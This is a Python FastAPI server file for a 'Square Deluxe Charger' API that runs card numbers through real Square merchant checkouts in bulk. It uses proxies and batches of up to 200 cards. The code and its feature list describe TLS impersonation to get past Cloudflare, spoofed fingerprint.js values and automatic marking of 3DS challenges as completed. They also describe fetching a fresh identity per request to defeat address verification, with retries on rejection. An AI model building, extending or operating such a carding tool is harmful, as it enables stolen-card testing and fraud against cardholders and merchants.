"""
main.py — Square Deluxe Charger API v4.2 (AUTO-FAKER)

Endpoints
─────────
GET  /                    → service info
GET  /health              → liveness probe
GET  /check               → charge a card via query params (site, card, proxy, mail, amount)
POST /check               → charge a card via JSON body
POST /check_multi          → multi-card charge (parallel)
GET  /test                 → test mode: uses the user's test URL + test card
GET  /test_cards          → list built-in Stripe test cards
GET  /stats                → runtime concurrency stats
GET  /docs                 → Swagger UI

Usage (simplest call):
    GET /check?site=https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM&card=4242424242424242|12|34|123&proxy=host:port:user:pass&amount=1.00

The `proxy` and `amount` params are optional — proxy defaults to direct
(test mode), amount defaults to $1.00.

v4.2: EVERY request auto-fetches a fresh REAL US identity from
fakenamegenerator.com (name, street, city, state, ZIP, phone) and uses it
across the whole checkout flow — fixes ADDRESS_VERIFICATION_FAILURE.
"""

import os
import time
import asyncio
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import List, Optional

from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

import checker


# ============================================================================
#  CONFIG
# ============================================================================
MAX_CONCURRENT_CHECKS = int(os.environ.get("MAX_CONCURRENT_CHECKS", "200"))
THREAD_POOL_SIZE       = int(os.environ.get("THREAD_POOL_SIZE", "200"))

VERSION = "4.2.2"


# ============================================================================
#  FastAPI app
# ============================================================================
app = FastAPI(
    title="Square Deluxe Charger API",
    description="FULL-AUTO Square checkout charger v2.0. Pass ANY Square checkout URL "
                "(https://checkout.square.site/merchant/<MID>/checkout/<CID>) + card + "
                "optional proxy + optional amount. Auto-extracts merchant_id + "
                "checkout_id from the URL, runs the full 12-step Square checkout flow "
                "(order → update → customer → hydrate → PoW solve → card nonce → "
                "3DS verify → final charge), and surfaces the REAL processor response. "
                "Uses curl_cffi (Chrome 131 TLS impersonation) so Square's Cloudflare "
                "doesn't 403 the API requests. Two sessions: direct for "
                "checkout.square.site (Cloudflare blocks the proxy IP), proxy for "
                "pci-connect.squareup.com (where geo matters).",
    version=VERSION,
    docs_url="/docs",
    redoc_url="/redoc",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ============================================================================
#  Shared thread pool + semaphore + counters
# ============================================================================
_executor: ThreadPoolExecutor = None  # type: ignore
_semaphore: asyncio.Semaphore = None  # type: ignore
_active_checks = 0
_active_lock = threading.Lock()
_total_checks = 0
_total_lock = threading.Lock()


def _incr_active():
    global _active_checks
    with _active_lock:
        _active_checks += 1


def _decr_active():
    global _active_checks
    with _active_lock:
        _active_checks -= 1


def _incr_total():
    global _total_checks
    with _total_lock:
        _total_checks += 1


@app.on_event("startup")
async def _startup():
    global _executor, _semaphore
    _executor = ThreadPoolExecutor(
        max_workers=THREAD_POOL_SIZE,
        thread_name_prefix="sqapi",
    )
    _semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
    print(f"[startup] sqapi v{VERSION} thread_pool={THREAD_POOL_SIZE} "
          f"max_concurrent={MAX_CONCURRENT_CHECKS} "
          f"(curl_cffi TLS={checker.HAS_CFFI}, Chrome 131 impersonation, "
          f"dual-session: direct checkout.square.site + proxy pci-connect.squareup.com)")


@app.on_event("shutdown")
async def _shutdown():
    global _executor
    if _executor is not None:
        _executor.shutdown(wait=False, cancel_futures=True)


# ============================================================================
#  Request / response models
# ============================================================================
class CheckRequest(BaseModel):
    site:   str            = Field(...,  description="Square checkout URL — https://checkout.square.site/merchant/<MID>/checkout/<CID>")
    card:   str            = Field(...,  description="Card in pipe format: number|mm|yy|cvv")
    proxy:  Optional[str]  = Field("",   description="ANY proxy format (host:port:user:pass or http://user:pass@host:port). Empty = direct/test mode.")
    amount: Optional[float] = Field(1.00, description="Amount in USD (default $1.00)")
    email:  Optional[str]  = Field("",   description="Email (fresh random one per attempt if empty)")
    mail:   Optional[str]  = Field("",   description="Alias for email")


class CheckMultiRequest(BaseModel):
    site:    str              = Field(...,  description="Square checkout URL")
    cards:   List[str]        = Field(...,  description="List of cards in pipe format (max 200)")
    proxy:   Optional[str]    = Field("",   description="ANY proxy format — empty = direct/test mode")
    amount:  Optional[float]  = Field(1.00, description="Amount in USD per card")
    workers: Optional[int]    = Field(15,   description="Parallel workers (max 50)")


# ============================================================================
#  Helpers
# ============================================================================
async def _run_check_async(card, site, proxy, amount_cents, email):
    async with _semaphore:
        _incr_active()
        _incr_total()
        try:
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(
                _executor,
                checker.check_one_sync,
                card, site, proxy, amount_cents, email,
            )
        finally:
            _decr_active()


async def _run_check_multi_async(cards, site, proxy, amount_cents, workers):
    async with _semaphore:
        _incr_active()
        _incr_total()
        try:
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(
                _executor,
                checker.check_multi_sync,
                cards, site, proxy, amount_cents, workers,
            )
        finally:
            _decr_active()


def _parse_amount(amount) -> int:
    """Convert a USD amount (float or string) to cents (int)."""
    try:
        return max(1, int(round(float(amount) * 100)))
    except Exception:
        return 100


# ============================================================================
#  Test cards registry
# ============================================================================
_TEST_CARDS = [
    ("4242424242424242", "12", "34", "123", "APPROVED",  "Visa test card — succeeds immediately"),
    ("4000000000000002", "12", "34", "123", "DECLINED",  "generic_decline"),
    ("4000000000009995", "12", "34", "123", "INSUFFICIENT", "insufficient_funds"),
    ("4000000000000069", "12", "34", "123", "EXPIRED",   "expired_card"),
    ("4000000000000127", "12", "34", "123", "CVV_MISMATCH", "incorrect_cvc"),
    ("4000000000000119", "12", "34", "123", "ERROR",     "processing_error"),
    ("4000002760003184", "12", "34", "123", "3DS",       "3DS verification required"),
]


# ============================================================================
#  GET / and /health
# ============================================================================
@app.get("/")
@app.get("/health")
async def health():
    return {
        "status":         "ok",
        "service":        "sqapi",
        "version":        VERSION,
        "max_concurrent": MAX_CONCURRENT_CHECKS,
        "thread_pool":    THREAD_POOL_SIZE,
        "active_in_flight": _active_checks,
        "total_dispatched": _total_checks,
        "features": [
            "FULL-AUTO: any Square checkout URL — merchant_id + checkout_id auto-extracted",
            "12-step Square checkout flow (order → update → customer → hydrate → PoW → card-nonce → 3DS → charge)",
            "curl_cffi Chrome 131 TLS impersonation (bypasses Cloudflare)",
            "DUAL-SESSION: direct for checkout.square.site (Cloudflare blocks proxy IP), proxy for pci-connect (geo matters)",
            "Universal proxy parser (any format — host:port:user:pass / http://user:pass@host:port / socks5://...)",
            "TEST MODE: proxy=empty/test/none → direct connection",
            "Square fingerprint.js v1/v1s/v2 bypass (random hashes + canvas/webgl)",
            "3DS challenge auto-resolution (SQUARE_THREEDS challenges marked COMPLETED)",
            "PoW auto-solve (SHA256 prefix matching, up to 500K iterations)",
            "Custom amount support ($1.00 default, any amount up to unlimited)",
            "AUTO-FAKER v4.2: EVERY request gets a fresh REAL US identity from "
            "fakenamegenerator.com (name + street + city + state + zip + phone) — "
            "full billing address in verification \u2192 NO MORE ADDRESS_VERIFICATION_FAILURE",
            "AVS auto-retry: on AVS_REJECTED the charge re-runs with a brand-new "
            "real identity (up to 5 attempts)",
            "Response includes the identity used (name/address/email/phone/source)",
        ],
        "endpoints": {
            "single":      "GET  /check?site=...&card=...&proxy=...&amount=1.00",
            "single_post": "POST /check  (JSON body)",
            "multi":       "POST /check_multi  (JSON body)",
            "faker":       "GET  /faker  (live auto-faker identity test)",
            "test_cards":  "GET  /test_cards",
            "stats":       "GET  /stats",
            "docs":        "/docs",
        },
        "made_by":   "upgraded from squarebypass.py v1.0",
        "timestamp": time.time(),
    }


# ============================================================================
#  GET /test_cards
# ============================================================================
@app.get("/test_cards")
async def get_test_cards():
    return {
        "count": len(_TEST_CARDS),
        "default": "4242424242424242|12|34|123",
        "cards": [
            {"card": f"{n}|{mm}|{yy}|{cvv}", "number": n, "exp": f"{mm}/{yy}",
             "cvv": cvv, "status": st, "response": resp}
            for n, mm, yy, cvv, st, resp in _TEST_CARDS
        ],
    }


# ============================================================================
#  GET /check  — single card charge via query params
# ============================================================================
@app.get("/check")
async def check_get(
    site:   str             = Query(...,  description="Square checkout URL — https://checkout.square.site/merchant/<MID>/checkout/<CID>"),
    card:   str             = Query(...,  description="number|mm|yy|cvv"),
    proxy:  Optional[str]   = Query("",   description="ANY proxy format — empty/test/none = direct mode"),
    amount: Optional[float] = Query(1.00,  description="Amount in USD (default $1.00)"),
    email:  Optional[str]   = Query("",   description="Email (fresh random one per attempt if empty)"),
    mail:   Optional[str]   = Query("",   description="Alias for email"),
):
    """FULL-AUTO single card charge via GET.

    Example:
      /check?site=https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM&card=4242424242424242|12|34|123&proxy=host:port:user:pass&amount=1.00
    """
    if not email and mail:
        email = mail
    if not site or not site.strip():
        raise HTTPException(status_code=400, detail="site is required")
    if not card or "|" not in card:
        raise HTTPException(status_code=400, detail="card must be: number|mm|yy|cvv")

    amount_cents = _parse_amount(amount)
    try:
        return await _run_check_async(card, site.strip(), proxy, amount_cents, email)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ============================================================================
#  POST /check  — single card charge via JSON body
# ============================================================================
@app.post("/check")
async def check_post(req: CheckRequest):
    """Single card charge via POST — for structured clients."""
    if not req.site or not req.site.strip():
        raise HTTPException(status_code=400, detail="site is required")
    if not req.card or "|" not in req.card:
        raise HTTPException(status_code=400, detail="card must be: number|mm|yy|cvv")

    email = req.email or req.mail or ""
    amount_cents = _parse_amount(req.amount)

    try:
        return await _run_check_async(req.card, req.site.strip(), req.proxy,
                                        amount_cents, email)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ============================================================================
#  POST /check_multi  — multi-card charge (parallel)
# ============================================================================
@app.post("/check_multi")
async def check_multi(req: CheckMultiRequest):
    """Multi-card charge — runs in parallel, returns a list of results."""
    if not req.cards:
        raise HTTPException(status_code=400, detail="cards list cannot be empty")
    if not req.site or not req.site.strip():
        raise HTTPException(status_code=400, detail="site is required")

    cards = req.cards[:200]
    workers = min(req.workers or 15, 50, len(cards))
    amount_cents = _parse_amount(req.amount)

    try:
        results = await _run_check_multi_async(cards, req.site.strip(),
                                                  req.proxy, amount_cents, workers)
        return {
            "total":   len(results),
            "results": results,
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ============================================================================
#  GET /faker — live test of the auto-faker identity chain (v4.2)
# ============================================================================
@app.get("/faker")
async def faker_test():
    """Fetch one fresh REAL US identity through the same chain every /check
    request uses (fakenamegenerator.com \u2192 $FAKER_URL \u2192 pool \u2192 fallback)."""
    if not checker.HAS_FAKER:
        raise HTTPException(status_code=503, detail="faker_client not available")
    start = time.time()
    try:
        ident = await asyncio.get_running_loop().run_in_executor(
            _executor, checker.faker_client.get_identity_safe)
        return {
            "ok": True,
            "elapsed": round(time.time() - start, 2),
            "identity": ident,
            "chain_status": checker.faker_client.status(),
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ============================================================================
#  GET /stats
# ============================================================================
@app.get("/stats")
async def stats():
    return {
        "max_concurrent_checks": MAX_CONCURRENT_CHECKS,
        "thread_pool_size":      THREAD_POOL_SIZE,
        "active_in_flight":      _active_checks,
        "total_dispatched":      _total_checks,
        "version":               VERSION,
        "curl_cffi_enabled":    checker.HAS_CFFI,
        "faker_enabled":         checker.HAS_FAKER,
        "faker_source":          "fakenamegenerator.com (ALL SELF) per request",
        "impersonate_target":   "chrome131",
        "flow":                  "12-step Square checkout (order → update → visited → "
                                 "customer → hydrate → product-info → 3DS-method → "
                                 "PoW solve → card-nonce → verification → "
                                 "3DS challenge resolve → final charge)",
        "fingerprint_bypass":    "Square fingerprint.js v1 / v1s / v2 (random hashes + "
                                 "canvas + webgl + fonts + plugins)",
        "session_strategy":      "DUAL: direct for checkout.square.site (Cloudflare), "
                                 "proxy for pci-connect.squareup.com (geo)",
        "proxy_formats":         ["host:port:user:pass", "host:port",
                                   "http://user:pass@host:port", "https://host:port",
                                   "socks5://user:pass@host:port"],
        "test_mode":             "proxy=empty/test/none → direct connection (no proxy)",
        "amount_default":        "$1.00 (100 cents) — any amount supported",
        "timestamp":             time.time(),
        "made_by":               "upgraded from squarebypass.py v1.0",
    }


# ============================================================================
#  Railway entry point
# ============================================================================
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    workers = int(os.environ.get("WEB_CONCURRENCY", "1"))
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        log_level="info",
        workers=workers,
        timeout_keep_alive=30,
    )
